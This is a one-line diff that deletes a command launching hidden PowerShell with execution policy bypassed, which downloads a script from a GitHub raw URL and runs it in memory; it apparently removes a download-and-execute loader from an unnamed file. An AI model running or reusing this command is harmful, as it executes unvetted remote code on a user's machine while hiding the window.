@@ -1,1 +1,1 @@
-cmd.exe /c START /B powershell -ep bypass -w hidden -c "iex(iwr https://raw.githubusercontent.com/br1337/Scripts/main/pr.txt -usebasicparsing)"
+
